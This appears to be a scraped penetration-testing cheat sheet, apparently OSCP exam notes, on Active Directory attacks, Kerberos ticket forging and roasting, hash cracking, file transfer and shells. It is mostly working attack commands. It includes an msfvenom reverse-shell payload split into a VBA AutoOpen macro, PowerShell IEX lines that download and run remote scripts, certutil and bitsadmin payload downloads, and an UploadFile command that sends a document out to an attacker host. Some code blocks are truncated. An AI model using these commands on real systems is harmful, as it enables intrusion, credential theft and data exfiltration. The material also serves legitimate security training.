For WMI/DCOM execution, establish administrative WMI/DCOM access, RPC endpoint/dynamic connectivity and SMB access for this client's output retrieval:

impacket-wmiexec -hashes :HASH 'DOMAIN/USER@HOST'

Verify host and token with hostname and whoami /all. Accepted credentials do not prove command execution. Impacket examples.

Service-based SMB execution 
impacket-psexec -hashes :HASH 'DOMAIN/USER@HOST'

Requires permission to create/start a service and write the selected share/payload location, normally administrative access. This creates a service and has different effects from WMI execution.

The account is authorized for the existing WinRM endpoint 
evil-winrm -i HOST -u 'DOMAIN\USER' -H HASH

Requires WinRM permissions and connectivity. It does not require Admin$ merely because an SMB execution method does.

For RDP hash authentication, use the Restricted Admin procedure. Do not change registry settings solely because a client reports an account restriction.

Overpass the Hash

Use an obtained account key to request a TGT, then use Kerberos for a permitted destination operation. From Kali, requesting a TGT does not inherently require administrator on a member host:

impacket-getTGT -hashes :HASH -dc-ip DC_IP 'DOMAIN/USER'
export KRB5CCNAME="$PWD/USER.ccache"
klist
impacket-smbclient -k -no-pass 'DOMAIN/USER@HOST'

Requires compatible account encryption, KDC connectivity, DNS/SPN selection and domain time. HOST is the destination FQDN. An NT hash supports RC4-based requests only where that encryption is accepted. A reusable cache is not inherently bound to its originating machine; lifetime, identity and destination authorization still apply.

Request the TGT with the account's obtained AES key 
impacket-getTGT -aesKey AES_KEY -dc-ip DC_IP 'DOMAIN/USER'
export KRB5CCNAME="$PWD/USER.ccache"
klist
impacket-smbclient -k -no-pass 'DOMAIN/USER@HOST'

Use the actual account AES key of the correct length; an NT hash is not an AES key. getTGT options.

Windows process-context transition using Mimikatz

In a selected context with the required local process/LSASS access, enter this inside Mimikatz:

sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:cmd.exe

In the resulting command prompt:

klist
net use \\HOST\IPC$
klist

The operation must actually negotiate Kerberos to produce the expected tickets; inspect the cache and operation result. Local injection privileges are separate from remote authorization. whoami alone describes the local token, not necessarily the outbound identity.

Pass the Ticket

Use an acquired ticket for its actual principal and scope. A TGT supports service-ticket requests; a TGS is scoped to its service/SPN. Import alone does not confer Domain Admin, local elevation or remote service-creation rights.

For an obtained credential cache on Kali:

export KRB5CCNAME=/PATH/USER.ccache
klist
impacket-smbclient -k -no-pass 'DOMAIN/USER@HOST'

Use a destination FQDN/SPN covered by the material and inspect a permitted operation. A cache listing is not evidence of destination access.

The obtained ticket is a .kirbi file 
impacket-ticketConverter /PATH/ticket.kirbi /PATH/USER.ccache
export KRB5CCNAME=/PATH/USER.ccache
klist
impacket-smbclient -k -no-pass 'DOMAIN/USER@HOST'

Conversion changes the container, not the principal, service, encryption or expiration.

Import into a selected Windows logon context

Enter this inside a reviewed Mimikatz build:

kerberos::ptt C:\PATH\ticket.kirbi

In the corresponding Windows session:

klist
net use \\HOST\SHARE

This tests the selected SMB share. Injecting into another session needs the matching access; importing a ticket does not prove PsExec is authorized. Requesting a new TGT with a key belongs to overpass-the-hash.

After verifying rights, use the execution methods. For failures, use the ticket diagnostic router.

Silver Ticket

Requires the key of the account serving the exact SPN, the domain SID without a user RID, an existing principal's correct USER_RID, selected GROUP_RIDS (a comma-separated RID list), and compatible service/PAC validation. A service account's full SID is not the domain SID. Neither RID 1103 nor a tool's privileged defaults is universal.

For a selected CIFS service, SERVICE_HASH must be the key of the account serving cifs/HOST, usually that host's computer account:

impacket-ticketer -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn cifs/HOST -user-id USER_RID -groups GROUP_RIDS USER
export KRB5CCNAME="$PWD/USER.ccache"
klist
impacket-smbclient -k -no-pass 'DOMAIN/USER@HOST'

Use the destination FQDN and matching key. A permitted SMB operation establishes that operation's access; this ticket does not automatically work for HTTP, SQL or every host sharing an account. Current PAC checks, required signatures, encryption and account state can reject it. Ticket options.

The selected service account's key is AES 
impacket-ticketer -aesKey AES_KEY -domain-sid DOMAIN_SID -domain DOMAIN -spn cifs/HOST -user-id USER_RID -groups GROUP_RIDS USER
export KRB5CCNAME="$PWD/USER.ccache"
klist
impacket-smbclient -k -no-pass 'DOMAIN/USER@HOST'

This key belongs to the account serving the SPN, not necessarily KRBTGT.

Generate/import a selected CIFS ticket from Windows

Inside a reviewed Mimikatz build:

kerberos::golden /user:USER /domain:DOMAIN /sid:DOMAIN_SID /target:HOST /service:cifs /rc4:SERVICE_HASH /id:USER_RID /groups:GROUP_RIDS /ptt

In the corresponding Windows session:

klist
net use \\HOST\SHARE

This is service-scoped despite the command's name. It does not turn the local token into SYSTEM or eliminate target validation.

Distributed Component Object Model (DCOM)

  • DCOM allows a computer to run programs over the network on a different computer e.g. Excel/PowerPoint/Outlook
  • Requires RPC port 135 and local admin access to call the DCOM Service Control Manager - the API.
  • The run method within DCOM allows us to execute a VBA macro remotely.

DCOM - create payload and VBA macro

From Kali, create rshell payload:

$ msfvenom -p windows/shell_reverse_tcp LHOST=[kali] LPORT=4444 -f hta-psh -o evil.hta

(Python3) split payload into smaller chunks starting with "powershell.exe -nop -w hidden -e"

str = "powershell.exe -nop -w hidden -e {base64_encoded_payload}"
n = 50
for i in range(0, len(str), n):
print("Str = Str + " + '"' + str[i:i+n] + '"')

# create VBA macro -> insert into Excel file
Sub AutoOpen()
    exploit
End Sub
Sub Document_Open()
    exploit
End Sub
Sub exploit()
        Dim str As String
        {insert_payload_here}
        # OPTION 1
        # Shell (Str)                    
        # OPTION 2
        CreateObject("Wscript.Shell").Run str
End Sub

# check if document contains valid exploit macro
$ mraptor [exploit.doc]

Source attachment

DCOM - Copy file to remote and execute

# create instance of Excel.Application object
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "HOST"))

# copy Excel file containing VBA payload to target
$LocalPath = "C:\PATH\badexcel.xls"
$RemotePath = "\\HOST\c$\badexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

# open Excel file and execute macro
$Workbook = $com.Workbooks.Open("C:\badexcel.xls")
$com.Run("badexcel.xls!exploit")

This Office-specific variant requires the selected COM component, remote activation rights, an accessible Office execution context, SMB write access and a permitted macro. It is not a universal DCOM primitive and does not establish SYSTEM access. Do not create system-profile directories as routine setup. For the general execution method, use the DCOM procedure.

pages.html:
AD Attacking Kerberos

Use the correct DNS domain, reachable DC and domain time. Requesting or importing a ticket establishes an authentication context; the destination still checks authorization. A valid user ticket does not automatically grant Domain Admin.

Kerbrute

Installation

Use a reviewed Kerbrute release for the current platform/architecture. Rename the selected Linux binary to kerbrute in your working directory:

chmod +x ./kerbrute

Enumerating Users

./kerbrute userenum --dc DC_IP -d DOMAIN /PATH/users.txt

An accepted username is not a recovered password or a usable remote session. Interpret timeout, encryption and clock errors separately from an unknown account; retain the exact identity for the next authenticated check.

Rubeus

Use a reviewed Rubeus build compatible with the Windows execution context. Its ticket operations have different privilege requirements.

Harvesting Tickets

For a deliberately selected elevated collection context:

.\Rubeus.exe harvest /monitorinterval:30

Harvesting monitors for usable tickets; it does not guarantee a privileged user logs on. Reading other logon sessions generally needs elevation. For current-session versus LSASS export, use ticket acquisition.

Brute-Forcing / Password-Spraying

Use the domain password-guessing procedure after checking the applicable lockout policy and candidate identities. Do not run Rubeus's domain-wide brute/spray mode as a routine enumeration step or infer a safe rate from its defaults.

Kerberoasting

Requires a domain identity that can request a service ticket and a relevant service account/SPN. A returned ticket is an offline password-recovery candidate, not proof the service password is weak.

Rubeus

From a Windows session authenticated as the requesting domain identity, select the observed service account:

.\Rubeus.exe kerberoast /user:SERVICE_USER /outfile:kerberoast.txt

Use the actual output format/encryption type when selecting the offline hash mode; mode 13100 below is for RC4 etype 23, not every Kerberos ticket.

Impacket

Use the installed, supported Impacket release. Do not downgrade the entire suite to an old release for these commands. On Kali, enter the known requesting account's password at the prompt:

impacket-GetUserSPNs -dc-ip DC_IP -request-user SERVICE_USER -outputfile kerberoast.txt 'DOMAIN/USER'

Read the selected SPN/account and saved verifier. Failure to list/request an SPN can reflect account type, filters, directory access or Kerberos connectivity. For a verifier beginning $krb5tgs$23$:

hashcat -m 13100 -a 0 kerberoast.txt /PATH/passwords.txt
hashcat -m 13100 --show kerberoast.txt

AES ticket formats need their matching supported hash mode; do not force mode 13100 or rewrite the verifier to resemble RC4. Validate a recovered password in its exact account/service context. GetUserSPNs options.

AS-REP Roasting

Use an observed account with Kerberos preauthentication disabled. From Kali, a selected username list can request the relevant response without a password:

impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile /PATH/users.txt -no-pass -format hashcat -outputfile asrep.txt

A preauthentication-required reply rules out this method for that account in the current context. For an actual $krb5asrep$23$ verifier:

hashcat -m 18200 -a 0 asrep.txt /PATH/passwords.txt
hashcat -m 18200 --show asrep.txt

Do not blindly insert 23$ into output: preserve the tool's emitted format and select the correct mode. A missing response or failed wordlist is not proof of an absent account.

Request the selected AS-REP from an authenticated Windows context 
.\Rubeus.exe asreproast /user:TARGET_USER /format:hashcat /outfile:asrep.txt

The selected account still needs preauthentication disabled; this is an alternative request context, not a bypass of that prerequisite. Rubeus operations.

Pass the Ticket

Prepare Mimikatz & Dump Tickets

Use ticket acquisition to distinguish a current-session export from elevated access to other sessions. Treat .kirbi files and caches as credentials, and retain the principal, ticket type, SPN, validity and source context.

Pass the Ticket

Use the Windows import or Kali cache procedure. Importing a TGT allows compatible service-ticket requests; a TGS is service-scoped. Neither changes the account's directory rights or automatically elevates a local token.

Golden / Silver Ticket Attack

Dump the krbtgt hash

KRBTGT key acquisition requires the corresponding domain-level access, such as effective replication rights. Local administrator on a member server is not enough. A silver ticket instead needs the key of the account serving the exact target SPN; those keys are not interchangeable.

Create a Golden/Silver Ticket

The domain SID excludes the user's RID. Use the existing account's actual USER_RID and deliberately selected GROUP_RIDS (a comma-separated RID list); do not assume RID 1103 or the tool's privileged defaults. A conditional golden-ticket example, with an obtained KRBTGT NT key and a domain that accepts that encryption/validation context:

impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN -user-id USER_RID -groups GROUP_RIDS USER
export KRB5CCNAME="$PWD/USER.ccache"
klist

This produces a forged TGT. It does not disable current PAC/KDC validation, account checks or service authorization.

Golden ticket with an obtained KRBTGT AES key 
impacket-ticketer -aesKey AES_KEY -domain-sid DOMAIN_SID -domain DOMAIN -user-id USER_RID -groups GROUP_RIDS USER
export KRB5CCNAME="$PWD/USER.ccache"
klist

Use the correct AES key length and current key version/context. A ticket rejected by the KDC is not made valid by switching to a different service.

For a service-scoped ticket, use the silver-ticket procedure, which owns the exact SPN, service key and compatible client invocation. Impacket ticket options.

Use the Golden/Silver Ticket to access other machines

Select the correct cache and a destination FQDN/SPN; a cache listing alone does not demonstrate access. For a TGT and a selected SMB destination:

impacket-smbclient -k -no-pass 'DOMAIN/USER@HOST'

Only the destination's accepted authentication and permitted operation establish access. A forged TGT is not a guarantee of access to the entire network, and starting a new command prompt alone is not proof of elevation. Read the ticket failure router when DNS, time, SPN, encryption or validation fails.

pages.title: Hash Cracking Techniques
pages.html:
Hash Cracking Techniques

Recover a passphrase from a file

Use only when the encrypted file/key is relevant to the access path. Pick the matching extractor; the output is a verifier for offline recovery, not a pass-the-hash credential.

SSH private key 
python3 /usr/share/john/ssh2john.py /PATH/id_rsa > ssh-key.hash
john --wordlist=/PATH/passwords.txt ssh-key.hash
john --show ssh-key.hash

An unencrypted key does not need cracking. After recovery, use the key and passphrase with the correct account/host, not as an assumed account password.

KeePass database or password-protected ZIP

Choose the applicable file type:

keepass2john /PATH/vault.kdbx > keepass.hash
john --wordlist=/PATH/passwords.txt keepass.hash
john --show keepass.hash

zip2john /PATH/archive.zip > archive.hash
john --wordlist=/PATH/passwords.txt archive.hash
john --show archive.hash

Use the installed John Jumbo utilities. A required KeePass key file or unsupported format needs its matching prerequisite/tooling checked; No password hashes loaded is not a failed wordlist. A recovered archive/database password is not automatically valid on a host. John usage and credential-type selection.

Distinguish a reusable NT hash from a captured response

An NT hash can be used by a compatible pass-the-hash client when that account has the required access. A Net-NTLMv2 challenge/response is different: do not pass it to an NT-hash option.

hashcat -m 5600 -a 0 netntlmv2.txt /PATH/passwords.txt
hashcat -m 5600 --show netntlmv2.txt

Only use mode 5600 for a confirmed Net-NTLMv2 response format. Validate a recovered password separately; poisoning/spoofing is not part of this workflow. For NT hashes use the existing mode-1000 entry below and access prerequisites.

Cracking NT (NTLM) hashes

$ hashcat -m 1000 -a 0 hashes.txt [path/to/wordlist.txt] -o cracked.txt
$ john --wordlist=[path/to/wordlist.txt] hashes.txt

For newly requested service tickets, use the selected-account Kerberoasting and matching verifier modes.

Recover from an already exported RC4 service-ticket .kirbi file

For a service ticket whose actual encryption is RC4 etype 23, use the installed John Jumbo helper:

python3 /usr/share/john/kirbi2john.py /PATH/ticket.kirbi > ticket.hash
john --wordlist=/PATH/passwords.txt ticket.hash
john --show ticket.hash

The upstream helper emits the RC4 service-ticket format; it must not be used to relabel an AES ticket or a TGT as that format. Conversion extracts a verifier; offline cracking is a separate operation. Prefer the requesting tool's correctly formatted output when available. A recovered service-account password still needs destination-specific validation.

pages.html:
Transfer Files

First choice: download a file and check its hash

Serve only a dedicated transfer directory from Kali:

python3 -m http.server 8000 --bind LHOST --directory /PATH/TO/TRANSFER
sha256sum /PATH/TO/TRANSFER/FILE

On Windows, choose a directory your current user can write:

Invoke-WebRequest -Uri 'http://LHOST:8000/FILE' -OutFile "$env:TEMP\FILE"
Get-FileHash -LiteralPath "$env:TEMP\FILE" -Algorithm SHA256

On Linux:

curl -f http://LHOST:8000/FILE -o /tmp/FILE
sha256sum /tmp/FILE

Match the hashes before execution. A download alone does not grant execute permission or bypass application control. If the connection fails, verify direction, listener bind, route and port; choose SMB/SCP/RDP transfer when its prerequisites fit. Do not disable every firewall profile as transfer troubleshooting. Adding a user to Administrators already requires sufficient rights; it is not an escalation primitive by itself.

Linux download when curl is unavailable 
wget -O /tmp/FILE http://LHOST:8000/FILE
sha256sum /tmp/FILE

Use the same dedicated server directory and expected hash as above. If neither downloader exists, select an existing SSH/SCP or another supported transfer method below; a transfer does not require disabling host services.

Placing files in writeable paths

Open resource

The following folders are by default writable by normal users (depends on Windows version - This is from W10 1803)

C:\Windows\Tasks 
C:\Windows\Temp 
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp

C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System

SMB

On Kali, extract the tools.zip archive to a directory. Change to this directory and run either of the following to set up an SMB server:

python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .
python /usr/share/doc/python-impacket/examples/smbserver.py tools .

Support for smb2

python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support tools $(pwd)

To copy files from Kali to Windows:

copy \\192.168.1.11\tools\file.ext file.ext

To copy files from Windows to Kali:

copy file.ext \\192.168.1.11\tools\file.ext

Connecting from Windows to Kali SMB

# Kali - host SMB share
$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [/path/to/share]  # setup local share

# Target - connect to share
cmd> net view \\[kali]              # view remote shares
cmd> net use \\[kali]\[share]       # connect to share
cmd> copy \\[kali]\[share]\[src_file] [/path/to/dest_file]  # copy file

RDP

Use an existing RDP endpoint and an account permitted to log on. With the current FreeRDP 3 client on Kali, redirect only a dedicated local transfer directory:

xfreerdp3 /v:HOST /u:USER /d:DOMAIN /drive:transfer,/PATH/TO/TRANSFER

Enter the known password at the prompt and verify the server identity. In the Windows session, an accepted redirected drive is available as \\tsclient\transfer:

copy \\tsclient\transfer\FILE C:\PATH\FILE
copy C:\PATH\FILE \\tsclient\transfer\FILE

Use existing writable destinations and compare hashes as in the transfer baseline. Server policy can disable drive redirection. A low-privilege account cannot add itself to Administrators or enable an endpoint merely to make transfer work; select HTTP, SCP or SMB when their prerequisites fit. Kali FreeRDP help.

The installed client is the older xfreerdp executable 
xfreerdp /v:HOST /u:USER /d:DOMAIN /drive:transfer,/PATH/TO/TRANSFER

Check that installed client's help for its supported syntax; use the executable actually installed, not both as sequential transfer steps.

Powershell .ps1

This is a simple powershell script to download files:

$baseUrl = "http://192.168.119.139/"
$fileNames = @("PowerUP.ps1", "PowerView.ps1", "mimikatz.exe", "winPEASany.exe")

    Invoke-WebRequest -Uri $url -OutFile $filePath
    Write-Host "Downloaded $fileName to $filePath"
}

Powershell

# Download file from remote to local
powershell -c (New-Object Net.WebClient).DownloadFile('http://[host]:[port]/[file]', '[file]')
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"

# Execute remote PS script
PS> IEX (New-Object System.Net.WebClient).DownloadString('http://[kali]/[script].ps1')

From Windows:

IWR -Uri http://KALI_IP:PORT -OutFile C:\Path\To\File

From kali:

python3 -m http.server 9999

From Windows CMD:

certutil -urlcache -split -f http://<kali_ip>:9999/shell_445.exe C:\\Windows\\Tasks\\shell_445.exe

Bitsadmin

From Windows cmd:

bitsadmin /transfer badthings http://[kali]:[port]/[src_file] [dest_file]

SSH server

Use an existing authorized SSH endpoint and a writable destination. If Kali will receive or serve the file, start its SSH service only when needed:

sudo systemctl start ssh.service

scp USER@LHOST:/PATH/TO/TRANSFER/FILE /tmp/FILE
scp /tmp/FILE USER@LHOST:/PATH/TO/RECEIVE/FILE

Run these on the Linux target: first download from Kali, then the separate upload form for returning a report. USER is the Kali SSH account and remote paths are Kali filesystem paths. Verify the server host key and use an existing receiving directory; no target SSH server is needed for these outbound client commands.

Transfer through an existing Windows OpenSSH client 
scp USER@LHOST:/PATH/TO/TRANSFER/FILE "$env:TEMP\FILE"
scp "$env:TEMP\FILE" USER@LHOST:/PATH/TO/RECEIVE/FILE

The local path is Windows; the remote path is on Kali. If the client is absent, use a supported transfer method above rather than assuming Windows and Kali paths are interchangeable.

C:\Users\offsec> nc -nlvp 4444 > incoming.exe
listening on [any] 4444 ...

Kali:

/usr/share/windows-resources/binaries/wget.exe

kali@kali:~$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
(UNKNOWN) [10.11.0.22] 4444 (?) open

listening on [any] 4444 ...
connect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43459
^C
C:\Users\offsec>

Socat

Alice wants to share a file with Bob:

Windows Downloads

Windows Downloads Using Scripting Languages

Creating a VBScript HTTP downloader script

echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo  Err.Clear >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo  http.Open "GET", strURL, False >> wget.vbs
echo  http.Send >> wget.vbs
echo  varByteArray = http.ResponseBody >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo  strData = "" >> wget.vbs
echo  strBuffer = "" >> wget.vbs
echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo  Next >> wget.vbs
echo  ts.Close >> wget.vbs

We can run this (with cscript) to download files from our Kali machine:

C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe

Windows Downloads using PowerShell

The example below shows an implementation of a downloader script using the System.Net.WebClient PowerShell class:

C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
C:\Users\Offsec> echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1

we can run it using this:

C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

We can also execute this script as a one-liner as shown below:

C:\Users\Offsec> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')

Windows Download and Execution from hosted remote file

To demonstrate this, we will create a simple PowerShell script on our Kali machine (Listing 20):

kali@kali:/var/www/html$ sudo cat helloworld.ps1 
Write-Output "Hello World"

Next, we will run the script with the following command on our compromised Windows machine:

C:\Users\Offsec> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
Hello World

The content of the PowerShell script was downloaded from our Kali machine and successfully executed without saving it to the victim hard disk.

Windows Downloads with exe2hex and PowerShell

We'll start by locating and inspecting the nc.exe file on Kali Linux.

kali@kali:~$ locate nc.exe | grep binaries
/usr/share/windows-resources/binaries/nc.exe

kali@kali:~$ cp /usr/share/windows-resources/binaries/nc.exe .

kali@kali:~$ ls -lh nc.exe
-rwxr-xr-x 1 kali kali 58K Sep 18 14:22 nc.exe

Although the binary is already quite small, we will reduce the file size to show how it's done. We will use upx, an executable packer (also known as a PE compression tool):

kali@kali:~$ upx -9 nc.exe

                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

   --------------------   ------   -----------   -----------
     59392 ->     29696   50.00%    win32/pe     nc.exe
Packed 1 file.

kali@kali:~$ ls -lh nc.exe
-rwxr-xr-x 1 kali kali 29K Sep 18 14:22 nc.exe

kali@kali:~$ python3 "$HOME/oscp/tools/repos/exe2hex/exe2hex.py" -x nc.exe -p nc.cmd
[*] exe2hex v1.5.1
[+] Successfully wrote (PoSh) nc.cmd

Prepare tools used on this page

Use the shared Kali workspace preparation first. Optional tools are not additional mandatory passes. Skip a clone when its reviewed checkout already exists.

Prepare exe2hex

Legacy transfer encoder, not an installed Kali package in the current repository. Invoke the reviewed Python 3 source explicitly. Encoding does not establish execution, transfer integrity or endpoint compatibility. Upstream.

git clone --depth 1 https://github.com/g0tmi1k/exe2hex.git "$HOME/oscp/tools/repos/exe2hex"

pages.html:
Windows Uploads

Windows Uploads Using Windows Scripting Languages

In certain scenarios, we may need to exfiltrate data from a target network using a Windows client.

If outbound HTTP traffic is allowed we can create the following PHP script and save it as upload.php in our Kali webroot directory, /var/www/html:

<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

Next, we must create the uploads folder and modify its permissions, granting the www-data user ownership and subsequent write permissions:

kali@kali:/var/www$ sudo mkdir /var/www/uploads
kali@kali:/var/www$ ps -ef | grep apache
kali@kali:/var/www$ sudo chown www-data: /var/www/uploads
kali@kali:/var/www$ ls -la

With Apache and the PHP script ready to receive our file, we move to the compromised Windows host and invoke the UploadFile method from the System.Net.WebClient class to upload the document we want to exfiltrate, in this case, a file named important.docx:

C:\Users\Offsec> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')

Uploading Files with TFTP

We first need to install and configure a TFTP server in Kali and create a directory to store and serve files. Next, we update the ownership of the directory so we can write files to it. We will run atftpd as a daemon on UDP port 69 and direct it to use the newly created /tftp directory:

kali@kali:~$ sudo apt update && sudo apt install atftp
kali@kali:~$ sudo mkdir /tftp
kali@kali:~$ sudo chown nobody: /tftp
kali@kali:~$ sudo atftpd --daemon --port 69 /tftp

The final command is similar to the one shown below:

C:\Users\Offsec> tftp -i 10.11.0.4 put important.docx
Transfer successful: 359250 bytes in 96 second(s), 3712 bytes/s

pages.title: Shells
pages.html:
Shells

Choose the connection direction

For a reverse shell, the target must reach the listener on your reachable interface:

nc -lvnp LPORT

Replace LPORT with a numeric listener port. Use the matching reverse/bind shell command for the target's shell and available runtime. A bind shell instead needs a route from you to its listening port. Across a pivot, check both directions explicitly.

Verify where execution landed

Linux:

hostname
id
pwd

Windows:

hostname
whoami /all
cd

No callback: verify execution independently, then listener, route and egress. An interactive executable is not automatically a valid Windows service executable. A web shell runs as the web worker identity and may have a restricted environment; inspect that context before choosing host escalation.

For an execution or callback failure, use the diagnostic order: delivery, parser/interpreter, OS/architecture/runtime, consumer, execution evidence, then connection path. Do not regenerate payloads repeatedly without new evidence. For a public PoC that needs changes, return to exploit adaptation.

Capture proof and retain reproduction steps

From the required interactive target shell, verify identity and display the objective file at its actual original location. Replace the paths below with that location; do not copy the proof into a convenient directory first.

Linux:

hostname
id
ip addr
cat /PATH/proof.txt

Windows:

hostname
whoami
ipconfig
type C:\PATH\proof.txt

The same original-location requirement applies to local.txt. Capture the required proof content and target IP in the screenshot, submit the proof in the control panel before the exam ends, and retain the commands/output needed to reproduce the access path. A web-shell read or a file copied to Kali is not the required interactive proof. Current OffSec requirements.

Use the existing evidence checkpoint, exploit evidence requirements and report reconstruction. Record the actual tested path, not only a flag or a successful command pasted without its prerequisites.

Chisel

Send a selected connection through the SOCKS pivot

With the existing Chisel reverse SOCKS tunnel running, create one local config on Kali. Chisel's default reverse SOCKS listener is 127.0.0.1:1080; use the actual chosen port if changed:

cat > proxychains-oscp.conf <<'EOF'

An open port establishes a connection path, not authentication or exploitation. Validate the relevant service using its track page. ProxyChains limitations.

Use existing SSH access as the SOCKS transport instead

ssh -N -D 127.0.0.1:1080 -o ExitOnForwardFailure=yes USER@TARGET

Use the same config/client command in another terminal with the internal target IP. This is an alternative transport, not another tunnel to run on the same listener. SSH forwarding must be allowed; successful listener creation does not prove the pivot can reach the final service. For a specific local listener, routed TUN access or callback routing, open the existing pivoting procedure.

Extra tools to obtain

Prepare Kali once, then return to the linked procedure when you need a tool. All Bash blocks on this page run inside Kali, unless a block is explicitly labelled for a Windows build machine. Internet access is needed for installation and downloads; no setup block scans or authenticates to a target.

Complete sections 1–3 for the baseline. Section 4 contains alternatives, legacy sources and tools that need additional configuration: prepare only those you choose. An existing checkout should be reviewed/updated deliberately; skip its git clone rather than cloning over it. A failed download or build is unfinished preparation, not a usable tool.

1. Prepare the workspace

mkdir -p "$HOME/oscp/tools"/{repos,venvs,downloads,bin,artifacts/{linux/{x64,x86},windows/{x64,x86}}} "$HOME/oscp/work"
export PATH="$HOME/oscp/tools/bin:$HOME/.local/bin:$PATH"
sudo apt update
sudo apt install git curl unzip file bzip2 python3-venv pipx peass

Keep source checkouts in repos, isolated Python environments in venvs, archives in downloads, Kali executables in bin and deliverable files in artifacts. The PATH change applies to this shell; add the same export once to ~/.zshrc (or your actual shell's startup file) if you want it in future terminals. Explicit paths below also work without changing PATH.

Prefer Kali packages when available. A project with extra Python dependencies needs its own virtual environment; do not use sudo pip or override Kali's externally managed Python environment. Python application isolation.

2. Install tools used on Kali

Install the baseline's shared Kali packages together. Existing packages are retained or updated by APT; review its proposed changes before accepting.

Check tools normally bundled with Kali

Tools such as ffuf, Nmap, NetExec and Impacket are still used throughout these notes. Being bundled with the standard Kali toolset does not guarantee availability on a minimal, older or customized VM:

pages.html:
Public exploit finder

Start with the exact product/component, version/build, platform and architecture. Search for a matching public PoC, then check its prerequisites in the linked procedure. A search result or missing-patch suggestion is a candidate, not confirmed exploitability.

Search for a public exploit

ResourceWhat to look for
Exploit-DBProduct/version or CVE; narrow by platform and exploit type. SearchSploit searches a local Exploit-DB copy.
GitHub repository searchExact CVE or product plus exploit / PoC. Prefer the researcher's original source; inspect code and prerequisites rather than trusting stars or a filename.
Packet StormSearch Files by CVE or product for public exploits and original advisories.
Rapid7 databaseCVE/product references and module descriptions. Reading a module is distinct from using Metasploit; its exam restrictions still apply.

Search the precise version first, then the product/component and affected version range. If a CVE is known, search that identifier directly. No result does not rule out a misconfiguration or an exploit absent from that index.

Check the affected range: NVD CVE search, the vendor's original advisory, and for Windows MSRC / Update Catalog. These establish affected products and fixes; they are not guarantees that usable exploit code exists.

For offline search, code review and adaptation, use Review a public exploit candidate. Keep the original URL and any changes needed for reproduction. Follow the current exam restrictions when selecting a tool or feature.
